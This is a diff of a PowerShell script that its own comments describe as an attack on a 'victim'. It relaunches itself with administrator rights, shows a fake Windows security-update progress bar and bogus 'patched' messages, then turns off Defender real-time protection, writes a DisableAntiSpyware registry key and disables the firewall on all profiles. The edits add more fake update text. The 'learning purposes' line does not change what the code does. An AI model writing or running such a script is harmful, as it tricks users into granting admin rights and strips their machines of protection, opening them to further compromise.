@@ -1,10 +1,10 @@
-# Change IP/PORT
+# Change IP/PORT.
+# For learning purposes ONY
 # Any Ideas?
 
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 
-if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))  
-
-{  
+{
 
   $arguments = "& '" +$myinvocation.mycommand.definition + "'"
 
@@ -14,8 +14,8 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 
 }
 for ($i = 1; $i -le 50; $i++ ) {
-    Write-Progress -Activity "Please wait while windows is checking for updates..." -Status "$i% Complete:" -PercentComplete $i
-    Start-Sleep -Milliseconds 0.500
+    Write-Progress -Activity "Please wait while Windows is checking for updates..." -Status "$i% Complete:" -PercentComplete $i
+    Start-Sleep -Milliseconds 0.700
 }
 
 Start-Sleep -Seconds 1
@@ -38,17 +38,34 @@ write-Host ="
 "
 
 
-Write-Output "[!] SECURITY UPDATE! Please don't turn off the device.....`r`n"
-# WRITING A MESSAGE FOR THE VICTIM ABOUT SOME CRITICAL UPDATE
+Write-Output "[!] SECURITY UPDATE! Do not turn off device.....`r`n"
+# WRITING A MESSAGE FOR THE [VICTIM] ABOUT SOME CRITICAL UPDATES
 Start-Sleep -Seconds 3
-Write-Output "`r`n[!] WINDOWS HAS FOUND SOME CRITICAL PROBLEMS! `r`n`r`n[!] After windows will pop-out, press 'yes' please and wait for the process to finish."
-# SLEEP FOR 4 SECONDS
-Start-Sleep -Second 4
+Write-Output "`r`n[!] WINDOWS FOUND SOME CRITICAL PROBLEMS! `r`n"
+# SLEEP FOR 2 SECONDS
+Start-Sleep -Second 2
+Write-Host "please wait for the process to finish.`r`n" -ForegroundColor green
+Start-Sleep -Second 2
+$updateActions = @(
+    "[+] Updated firewall to prove the network security.",
+    "[+] Fixed bad rules in firewall configurations.",
+    "[+] Patched security vulnerabilities in the operating system.",
+    "[+] Improved system performance and stability.",
+    "[+] Installed the latest security definitions for antivirus.",
+    "[+] Updated system drivers for improved hardware compatibility."
+)
+
+foreach ($action in $updateActions) {
+    Write-Host $action -ForegroundCOlor Red
+    Start-Sleep -Seconds 3
+}
+
+Write-Output "Windows Update has been completed successfully."
 
 
 # DISABLE THE REAL-TIME PROTECTION WHILE USING ADMINISTRATOR PRIVILEGE
 $Mal = Set-MpPreference -DisableRealtimeMonitoring $true
-# INJECT A MALICIOUS DWORD INSIDE REGESTIRY
+# INJECT A MALICIOUS DWORD INSIDE REGISTRY
 $Mal2 = New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
 # TURN OFF FIREWALL
 $Mal3 = netsh advfirewall set allprofiles state off
